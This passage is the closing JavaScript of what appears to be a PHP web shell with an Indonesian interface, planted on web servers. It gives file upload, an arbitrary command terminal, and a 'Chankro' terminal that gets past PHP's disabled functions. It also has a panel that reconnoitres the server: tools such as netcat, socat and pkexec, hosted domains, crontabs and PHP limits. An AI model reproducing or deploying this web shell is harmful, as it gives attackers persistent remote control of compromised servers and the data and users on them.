        setTimeout(function(){um.textContent='';um.className='';um.style.opacity='1';},400);
      }, 4000);
      input.value='';
      rl();
      return;
    }
    var f = fs[idx++];
    
    um.textContent = '⇧ Uploading '+f.name+'...'; 
    um.className='';
    
    var fd = new FormData(); fd.append('upl',f); fd.append('dir',D);
    fetch(SELF,{method:'POST',body:fd}).then(function(res){return res.json();}).then(function(r){
      
      um.textContent = r.ok ? '✓ '+r.msg : '❌ '+r.msg;
      
      um.className = r.ok ? 'mok' : 'merr';
      uploadNext();
    });
  }
  uploadNext();
}

/* TERMINAL */
function sc(){
  var inp = document.getElementById('t-in');
  var raw = inp.value.trim();
  if(!raw) return;
  H.unshift(raw); hi=-1; inp.value='';
  if(raw.toLowerCase()==='clear'){ct();return;}
  ao(raw,'<span class="spin"></span>','ld');
  api({action:'terminal',cmd:raw}).then(function(res){
    var spin = document.querySelector('#t-out .spin');
    if(spin) spin.closest('.te').parentNode.removeChild(spin.closest('.te'));
    // Update TCWD dari respons server
    if(res.cwd){ TCWD = res.cwd; document.getElementById('ti-cwd').textContent = res.cwd; }
    ao(raw, res.out||'(no output)');
  });
}
function ao(cmd,out,cls){
  cls = cls||'';
  var d = document.createElement('div');
  d.className='te';
  d.innerHTML = '<div><span class="tp norm">'+x(CU)+'@'+x(CH)+' $</span> <span class="tc">'+x(cmd)+'</span></div>'
    +'<div class="to">'+(cls==='ld'?out:x(String(out||'')))+'</div>';
  document.getElementById('t-out').appendChild(d);
  document.getElementById('t-out').scrollTop=9e9;
}
function ct(){document.getElementById('t-out').innerHTML='';}
function tk(e){
  if(e.key==='Enter'||e.keyCode===13){sc();return;}
  if(e.key==='ArrowUp'||e.keyCode===38){if(hi<H.length-1)hi++;document.getElementById('t-in').value=H[hi]||'';e.preventDefault();}
  if(e.key==='ArrowDown'||e.keyCode===40){if(hi>0)hi--;document.getElementById('t-in').value=H[hi]||'';e.preventDefault();}
}

/* TERMINAL BYP (Chankro Bypass) */
var HB   = [];
var hbi  = -1;
var BDIR = TCWD;

function scByp(){
  var inp = document.getElementById('byp-in');
  var raw = inp.value.trim();
  if(!raw) return;
  HB.unshift(raw); hbi=-1; inp.value='';
  aoByp(raw,'<span class="spin"></span>','ld','');
  api({action:'byp_terminal',cmd:raw,dir:BDIR}).then(function(res){
    var spin = document.querySelector('#byp-out .spin');
    if(spin && spin.closest) spin.closest('.te').parentNode.removeChild(spin.closest('.te'));
    if(res.dir){ BDIR=res.dir; document.getElementById('byp-dir').textContent=res.dir; }
    var out = res.ok
      ? (res.out && res.out.length ? res.out : '(no output — command ran but produced no output)')
      : ('[ERROR] '+(res.msg||'Bypass gagal'));
    var badge = '';
    if(res.ok && res.method && res.method!=='none'){
      badge = ' <span class="byp-m byp-ok">&#9889; '+x(res.method)+'</span>';
    } else if(!res.ok){
      badge = ' <span class="byp-m byp-fail">&#10060; error</span>';
    }
    aoByp(raw, out, '', badge);
  });
}

function aoByp(cmd,out,cls,badge){
  cls=cls||''; badge=badge||'';
  var d=document.createElement('div');
  d.className='te';
  d.innerHTML='<div><span class="tp" style="color:var(--y)">byp@'+x(CH)+' $</span> <span class="tc">'+x(cmd)+'</span>'+badge+'</div>'
    +'<div class="to">'+(cls==='ld'?out:x(String(out||'')))+'</div>';
  document.getElementById('byp-out').appendChild(d);
  document.getElementById('byp-out').scrollTop=9e9;
}

function ctByp(){document.getElementById('byp-out').innerHTML='';}

function tkByp(e){
  if(e.key==='Enter'||e.keyCode===13){scByp();return;}
  if(e.key==='ArrowUp'||e.keyCode===38){if(hbi<HB.length-1)hbi++;document.getElementById('byp-in').value=HB[hbi]||'';e.preventDefault();}
  if(e.key==='ArrowDown'||e.keyCode===40){if(hbi>0)hbi--;document.getElementById('byp-in').value=HB[hbi]||'';e.preventDefault();}
}

function testByp(){
  var d = document.getElementById('byp-out');
  var el = document.createElement('div');
  el.className = 'te';
  el.innerHTML = '<div><span class="tp" style="color:var(--y)">byp@'+x(CH)+' $</span>'
    +' <span class="tc">-- Test Bypass Environment --</span></div>'
    +'<div class="to"><span class="spin"></span> Memeriksa environment...</div>';
  d.appendChild(el); d.scrollTop=9e9;
  api({action:'byp_test'}).then(function(r){
    var s = el.querySelector('.to');
    if(!r.ok){ s.textContent='Gagal: '+(r.msg||'error'); return; }
    var nl='\n';
    var g='<span style="color:var(--g)">&#10003;</span>';
    var rr='<span style="color:var(--r)">&#10007;</span>';
    var html='<b style="color:var(--acc2)">&#128269; Hasil Test Bypass:</b>'+nl+nl;
    html+='PHP Version  : <b>'+x(r.php_ver)+'</b>'+nl;
    html+='OS / LD      : '+x(r.ld_note)+nl;
    html+='disable_fn   : '+x(r.disable_fn)+nl;
    html+='ELF Hook     : '+g+' <span style="color:var(--g)">Hardcoded (standalone)</span>'+nl+nl;
    html+='<b>Trigger Functions Tersedia:</b>'+nl;
    if(r.avail && r.avail.length){
      for(var i=0;i<r.avail.length;i++) html+='  '+g+' '+x(r.avail[i])+nl;
    } else {
      html+='  '+rr+' <span style="color:var(--r)">Tidak ada! Bypass tidak akan berjalan.</span>'+nl;
    }
    var canByp = r.hook_ok && r.os_ok && r.avail && r.avail.length>0;
    var verdict = canByp
      ? '<b style="color:var(--g)">&#9889; BYPASS SIAP DIGUNAKAN</b>'
      : '<b style="color:var(--r)">&#10060; BYPASS TIDAK TERSEDIA DI SERVER INI</b>';
    html+=nl+verdict;
    s.innerHTML = html;
    d.scrollTop=9e9;
  });
}

/* SYSINFO */
function loadSysInfo(){
  var grid = document.getElementById('si-grid');
  grid.innerHTML='<div class="si-loading"><span class="spin"></span> Mengumpulkan data sistem...</div>';
  document.getElementById('si-ts').textContent='';
  api({action:'sysinfo'}).then(function(r){
    if(!r.ok){grid.innerHTML='<div class="si-loading" style="color:var(--r)">&#10060; Gagal: '+x(r.msg)+'</div>';return;}
    var d = r.data;
    document.getElementById('si-ts').textContent='Diperbarui: '+new Date().toLocaleTimeString('id-ID');

    function row(label,val,col){
      col=col||'var(--acc2)';
      return '<div class="si-row"><span class="si-k">'+x(label)+'</span><span class="si-v" style="color:'+col+'">'+x(String(val||'N/A'))+'</span></div>';
    }
    function preCard(icon,title,content,full){
      var cls = full ? 'si-card si-card-full' : 'si-card';
      return '<div class="'+cls+'"><div class="si-head">'+icon+' '+x(title)+'</div><div class="si-body"><div class="si-pre">'+x(String(content||'N/A'))+'</div></div></div>';
    }
    function rowCard(icon,title,rows,full){
      var cls = full ? 'si-card si-card-full' : 'si-card';
      return '<div class="'+cls+'"><div class="si-head">'+icon+' '+x(title)+'</div><div class="si-body">'+rows.join('')+'</div></div>';
    }

    function badgeMini(label,on){
      var col = on?'var(--g)':'var(--r)';
      var bg  = on?'rgba(16,185,129,.07)':'rgba(239,68,68,.07)';
      var bd  = on?'rgba(16,185,129,.2)':'rgba(239,68,68,.2)';
      return '<span style="display:inline-flex;align-items:center;gap:3px;padding:1px 7px;border-radius:8px;font-size:9px;font-weight:700;color:'+col+';background:'+bg+';border:1px solid '+bd+';white-space:nowrap">'+x(label)+'<b style="font-size:8px">'+(on?'✓':'✗')+'</b></span>';
    }

    var tools=[['Oracle',d.tool_oracle],['SSH2',d.tool_ssh2],['MySQL',d.tool_mysql],['cURL',d.tool_curl],
      ['WGET',d.tool_wget],['Perl',d.tool_perl],['Python',d.tool_python],['PKEXEC',d.tool_pkexec],
      ['Netcat',d.tool_nc],['Socat',d.tool_socat],['Git',d.tool_git],['ZIP',d.tool_zip],
      ['TAR',d.tool_tar],['GZIP',d.tool_gzip],['BZIP2',d.tool_bzip2]];
    var toolsHtml='<div class="si-row" style="flex-direction:column;gap:5px;padding-top:6px"><span class="si-k" style="font-size:10px">Tools</span>'
      +'<div style="display:flex;flex-wrap:wrap;gap:4px;padding-top:2px">'+tools.map(function(t){return badgeMini(t[0],t[1]);}).join('')+'</div></div>';

    var card1=rowCard('&#128421;','Server & System Info',[
      row('Web Server',d.web_server,'var(--acc2)'),
      row('System',d.system,'var(--acc2)'),
      row('Hostname',d.hostname,'var(--t1)'),
      row('Server IP',d.server_ip,'var(--t1)'),
      row('Server Time',d.server_time,'var(--t1)'),
      row('Uptime',d.uptime,'var(--t1)'),
      row('PHP Version',d.php_version,'var(--acc2)'),
      row('PHP.ini',d.php_ini,'var(--t2)'),
      row('Memory Limit',d.memory_limit,'var(--t1)'),
      row('Upload Max',d.upload_max,'var(--t1)'),
      row('open_basedir',d.open_basedir,'var(--y)'),
      '<div class="si-row"><span class="si-k">Disable Function</span><span class="si-v" style="color:'+(d.disable_fn_safe?'var(--g)':'var(--r)')+';font-weight:700">'+x(d.disable_fn)+'</span></div>',
      toolsHtml,
    ]);

    var card2=preCard('&#128039;','OS Release & Kernel',
      [d.os_release, d.kernel?'\nKernel : '+d.kernel:'', d.arch?'Arch   : '+d.arch:''].filter(Boolean).join('\n')
    );

    var logCores=String(d.cpu_logical||'').trim();
    var phyCores=String(d.cpu_phys||'').trim();
    var coresStr=logCores?(phyCores&&phyCores!==logCores?logCores+' logical / '+phyCores+' physical':logCores+' logical'):'N/A';
    var ramBar='';
    if(d.ram_total_mb&&d.ram_total_mb!=='N/A'){
      var total=parseInt(d.ram_total_mb)||0;
      var used=parseInt(d.ram_used_mb)||0;
      var pct=total>0?Math.round(used/total*100):0;
      var col=pct>85?'var(--r)':pct>60?'var(--y)':'var(--g)';
      ramBar='<div class="si-row" style="flex-direction:column;gap:6px"><span class="si-k">RAM</span>'
        +'<div style="display:flex;justify-content:space-between;gap:4px;font-size:10px;">'
        +'<span style="color:var(--t2)">Total: <b style="color:var(--t1)">'+x(d.ram_total_mb)+'</b></span>'
        +'<span style="color:var(--t2)">Used: <b style="color:'+col+'">'+x(d.ram_used_mb)+'</b></span>'
        +'<span style="color:var(--t2)">Free: <b style="color:var(--g)">'+x(d.ram_free_mb)+'</b></span></div>'
        +'<div style="height:6px;background:var(--bd);border-radius:3px;overflow:hidden">'
        +'<div style="height:100%;width:'+pct+'%;background:'+col+';border-radius:3px;transition:width .6s"></div></div></div>';
    }

    // HDD (single row, same style as RAM)
    var hddBar='';
    if(d.hdd_total&&d.hdd_total!=='N/A'){
      var hpct=parseInt(d.hdd_pct)||0;
      var hcol=hpct>90?'var(--r)':hpct>70?'var(--y)':'var(--g)';
      hddBar='<div class="si-row" style="flex-direction:column;gap:6px"><span class="si-k">HDD</span>'
        +'<div style="display:flex;justify-content:space-between;gap:4px;font-size:10px;">'
        +'<span style="color:var(--t2)">Total: <b style="color:var(--t1)">'+x(d.hdd_total)+'</b></span>'
        +'<span style="color:var(--t2)">Used: <b style="color:'+hcol+'">'+x(d.hdd_used)+'</b></span>'
        +'<span style="color:var(--t2)">Free: <b style="color:var(--g)">'+x(d.hdd_free)+' ['+hpct+'%]</b></span></div>'
        +'<div style="height:6px;background:var(--bd);border-radius:3px;overflow:hidden">'
        +'<div style="height:100%;width:'+hpct+'%;background:'+hcol+';border-radius:3px;transition:width .6s"></div></div></div>';
    } else {
      hddBar='<div class="si-row"><span class="si-k">HDD</span><span class="si-v" style="color:var(--t3)">Tidak dapat dibaca</span></div>';
    }

    // Domains (single row, same style as other rows, inside CPU & Hardware card)
    var domsVal=String(d.domains||'N/A');
    var domsIsCantRead=(domsVal.indexOf('Cant Read')===0);
    var domsColor=domsIsCantRead?'var(--r)':'var(--acc2)';
    var domainsRow='<div class="si-row"><span class="si-k">Domains</span><span class="si-v" style="color:'+domsColor+'">'+x(domsVal)+'</span></div>';

    var card3=rowCard('&#9881;','CPU & Hardware',[
      '<div class="si-row"><span class="si-k">CPU Model</span><span class="si-v" style="color:var(--acc2)">'+x(String(d.cpu_model||'N/A').trim())+'</span></div>',
      '<div class="si-row"><span class="si-k">CPU Cores</span><span class="si-v" style="color:var(--t1)">'+x(coresStr)+'</span></div>',
      '<div class="si-row"><span class="si-k">Architecture</span><span class="si-v" style="color:var(--t1)">'+x(String(d.cpu_arch||'N/A').trim())+'</span></div>',
      ramBar,
      hddBar,
      domainsRow,
    ].filter(Boolean));

    var cronContent = [
      '═══ Crontab user saat ini ═══', d.cron_user||'(kosong)', '',
      '═══ /etc/crontab ═══', d.cron_system||'(kosong)', '',
      '═══ /etc/cron.d/ ═══', d.cron_d||'(kosong)', '',
      'cron.hourly  : ' + (d.cron_hourly||'-'),
      'cron.daily   : ' + (d.cron_daily||'-'),
      'cron.weekly  : ' + (d.cron_weekly||'-'),
      'cron.monthly : ' + (d.cron_monthly||'-')
    ].join('\n');
    var card4=preCard('&#9200;','Crontab (File System Read)',cronContent,true);

    grid.innerHTML=[card1,card2,card3,card4].join('');
  });
}

/* TOAST */
function toast(msg,type){
  type=type||'info';
  var el=document.createElement('div');
  el.className='toast t-'+type; el.innerHTML=String(msg);
  document.body.appendChild(el);
  setTimeout(function(){if(el.parentNode)el.parentNode.removeChild(el);},2800);
}

/* UTIL */
function x(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function j(s){return String(s).replace(/\\/g,'\\\\').replace(/'/g,"\\'");}

/* String.prototype.endsWith polyfill for IE/old PHP browsers */
if(!String.prototype.endsWith){
  String.prototype.endsWith=function(search,len){
    if(len===undefined||len>this.length) len=this.length;
    return this.substring(len-search.length,len)===search;
  };
}

/* Element.closest polyfill */
if(!Element.prototype.closest){
  Element.prototype.closest=function(s){
    var el=this;
    while(el&&el.nodeType===1){if(el.matches?el.matches(s):el.msMatchesSelector(s))return el;el=el.parentElement||el.parentNode;}
    return null;
  };
}

/* INIT */
document.addEventListener('DOMContentLoaded',function(){
  ld(D);
  document.getElementById('modal').addEventListener('click',function(e){if(e.target.id==='modal')cm();});
  document.getElementById('ed-wrap').addEventListener('click',function(e){if(e.target.id==='ed-wrap')ce();});
  document.addEventListener('keydown',function(e){if(e.key==='Escape'||e.keyCode===27){cm();ce();}});
});
</script>
</body>
</html>
